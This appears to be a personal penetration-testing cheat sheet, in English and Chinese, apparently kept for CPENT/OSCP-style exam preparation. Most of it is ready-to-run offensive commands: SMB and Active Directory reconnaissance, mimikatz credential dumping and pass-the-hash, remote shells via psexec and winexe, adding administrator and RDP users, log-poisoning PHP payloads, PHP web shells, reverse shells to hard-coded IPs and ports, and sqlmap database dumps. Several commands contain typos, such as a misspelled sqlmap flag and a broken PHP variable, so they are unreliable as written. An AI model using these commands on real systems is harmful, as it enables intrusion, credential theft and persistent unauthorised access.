<img width="975" height="88" alt="image" src="https://github.com/user-attachments/assets/7040f463-84bf-4d86-a3d1-42fa66879850" />Markdown語法：https://hackmd.io/@eMP9zQQ0Qt6I8Uqp2Vqy6w/SyiOheL5N/%2FBVqowKshRH246Q7UDyodFA  
  
https://blog.stevenyu.tw/2022/06/10/%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90-cpent-%E8%80%83%E8%A9%A6%E5%BF%83%E5%BE%97%E3%80%81%E4%BB%A5%E5%8F%8A%E8%88%87-oscp-%E7%9A%84%E6%AF%94%E8%BC%83/  
# NMAP Reacon   
nmap -sS -n -p 445 --script smb-protocls 192.168.1.1   
nmap --script http-shellshock --script-args uri=/cbi-bin/keygen,cmd=ls 192.168.1.1
nmap -sV --script=vuln 192.168.1.1

# Rustscan, Scan open ports
``` rustscan -u 5000 -t 7000 -a 192.168.1.1 ```  
``` rustscan -u 5000 -t 7000 --script none -a 192.168.1.1 ```  
``` rustscan -u 5000 -t 7000 none -a 192.168.1.1 -- -Pn -sVC -OA host_1 ```  

# Windows Reacon / AD Reacon   
## Commands on Windows   
``` nbtstat -A (IP)  ```  
``` adreacon.ps1  ```  
## Open Ports  
``` netstat -aof | findstr 3389 ```  
## Commands on Linux   
``` enum4linux-ng -A  ```  
``` enum4linux -u martin -p apple -a -u -G -S <IP_Address> ```  
``` nbtscan 192.168.1.1-254 ```  
# Reacon SMB  
net view \\192.168.1.1  
dir \\192.168.1.1  
smbclient -L //IP -U DC_name\\acount  
smbclient -L //IP -U DC_name\\acount%password    
smbclient -N -L //IP/  
nmap -n -sS -p137,138,139,448 --script smb-os-discovery 192.168.1.1  
nmap -sS -n -p 445 --script smb-protocls 192.168.1.1  
nmblookup -A 192.168.1.1  
nmblookup -a windows8  

# Use SMB  
smbclient -L //IP -U DC_name\\acount  
smbclient //IP/<Folder> -U DC_name\\account  
smbclient //192.168.1.1/C$ -U DC_name\\account  

# SMB Servre  
impacket-smbserver share /tmp/smb -smb2support --debug

# Download File   
certutil -urlcache -split -f <URL> <輸出檔名>  
iwr

# Windows Remote  
## WinRM   
evil-winrm  
## RDP   
```xfreerdp3```  
## Enable RDP  
``` reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f ```  
``` net start termservice ```  
``` netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes ```  
``` netsh advfirewall firewall set rule name="Remote Desktop - User Mode (TCP-In)" new enable=yes ```  
``` netsh advfirewall firewall set rule name="Remote Desktop - User Mode (UDP-In)" new enable=yes ```  
### Powershell  
``` Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections -Value 0```  
## psexec  
```impacket-psexec```  
psexec \\192.168.1.1: cmd.exe  
## smbexec   
```impacket-smbexec```  
## Winexe  
``` winexe -U administrator%'Pa$$W0rd' //192.168.1.1 cmd.exe ```  
``` pth-winexe -U  //192.168.1.1 cmd.exe ```

# Dump Password
## mimikatz   
privilege::debug  
tocke::elevate  
lsadump::sam  
sekurlsa::pth /user:administrator /domain:. /ntlm:<ntlm hash>  

# Windows Create New USer for RDP  
``` net user <帳號名稱> <密碼> /add ```  
``` net localgroup administrators <帳號名稱> /add ```  
``` net localgroup "Remote Desktop Users" <帳號名稱> /add ```  
## Query  
``` net localgroup administrators ```  
``` net localgroup "Remote Desktop Users ```  

# GDB  
## Install PEDA Plgu-in   
## Commands  
gdb XXXX(binary name)  
b main  
run  
info registers  
disassemble main  
p system  
search /bin/sh  

# Privilege Escalation   
## Overlay   
https://github.com/briskets/CVE-2021-3493  
## Shellshock  
CVE-2014-6271  
## sudo -l  
```sudo -l ``` 
# Firmware Analyze  
## binwalk  
binwalk -e --signature --term (Filename)  
## binwalk3  
binwalk3  
## firmware analysis toolkit(fat)  
sudo ./fat3.py (filename)  
## AttifyOS Emulation  

# Hash Cracker   
## John   
john --wordlist=/usr/share/wordlists/rockyou.txt <Filename>  
## Hashcat   

# Web Recon   
## Manual  
robots.txt
sitemap.xml
## Nikto     
## wpscan   
```wpscan --update ```  
```wpscan --enumate```  
```wpscan -e u,p ```  

## Whatweb   
``` whatweb 192.168.1.1  ```   
``` whatweb -v 192.168.1.1 ```   
``` whatweb --log-verbose=log.txt 192.168.1.1 ```   
# Web Page Burte Force    
## dirb  
## gobuster  
## feroxbuster  
## dirbuster  

# Web Attack  
## LFI  
## RFI  
## CSRF  
## XSS  

# SQLi  
## 手動確認漏洞存在   
單引號'  
變數及單引號 abc'  
數字1  
數字0  
## sqlmap   
```sqlmap -u "www.example.com" --cooikes=<cookies>  --dump  ```   
```sqlmap -r <request.filename> --dump  ```  
```sqlmap -r <request.filename> --dump  --level 2```  
```sqlmap -u "www.example.com" --cooikes=<cookies>  --dbs  ```  
```sqlmap -u "www.example.com" --cooikes=<cookies>  -D [Database name] --tables  ```  

```sqlmap -u "www.example.com" --cooikes=<cookies>  -p '[vuln field name]' --dbs  ```  

```sqlmap -u "www.example.com" --method POST --data "[Copied POST Request]" -p '[vuln field name]' --dbs ```  
```sqlmap -u "www.example.com" --cooikes=<cookies>  -p '[vuln field name]' --dbs  ```  

# Log Poison   
## SSH Log (/var/log/auth.log) (/var/log/secure)     
```ssh '<?php system($_GET["cmd"]); ?>'@192.168.1.1  ```
``` ssh -l '<?php system($_GET["cmd"]); ?>'@192.168.1.1  ```  
## Apache Log (/var/log/apache2/access.log)  
``` User-Agent: <?php system($_GET['cmd']); ?>  ```  

# Reverse Shell   
## php   
``` php -r '$sock=fsockopen("192.168.1.1",4444);$proc=proc_open("/bin/sh -i", array(0>=$sock, 1=>$sock, 2=>sock),$pipes);' ```  
``` <?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?> ```  
``` <?php system($_GET['cmd]); ?> ```  


# TTY
## Reverse Shell Generator  
``` https://www.revshells.com/ ```  
## Python   
``` python3 -c 'import pty; pty.spawn("/bin/sh")' ```  
## Bash  
``` bash -c 'bash -i &> /dev/tcp/192.168.0.18/8888 0<&1' ```  

## Wordpress Manual Attack  
http://192.168.1.1/wp-content/themes/twentyfifteen/404.php  


# Internet Open Target/Victim  
## http://testphp.vulnweb.com/  
## http://scanme.nmap.org   

# Pivoting  
## Chisel  
## Ligolo-ng  
## Datapipe  
## Socat  

# host檔案  
## Linux: \etc\host  
## Windows: C:\Windows\System32\drivers\etc\hosts  

# Credential dump  
##  sudo impacket-secretdump htb/kali:kali123@10.10.10.161

# 找檔案  
## Windows  
## Linux  
find / -iname <string> -type f  
find / -type f -perm -4000 2>/dev/null  
find / -type f -perm -4000 -user root -ls 2>/dev/null  
find / -type f -perm -2000 2>/dev/null  

# Web REF  
## exploit db  
https://www.exploit-db.com/  
## Payloads All The Things  
https://swisskyrepo.github.io/PayloadsAllTheThings/    
https://github.com/swisskyrepo/PayloadsAllTheThings  
## Internal All The Things  
https://swisskyrepo.github.io/InternalAllTheThings/  
## Hardware All The Things
https://swisskyrepo.github.io/HardwareAllTheThings/  

# SNMP  
## onesixtyone    
``` onesixtyone 192.168.1.1 public ```  
``` onesixtyone 192.168.1.1 private ```  
# IOT  
## DICOM  
### Port 4242  
## Firmware Analysis  
```file <filename> ```  
```sudo hexdump -c firmeware.bin | more ```
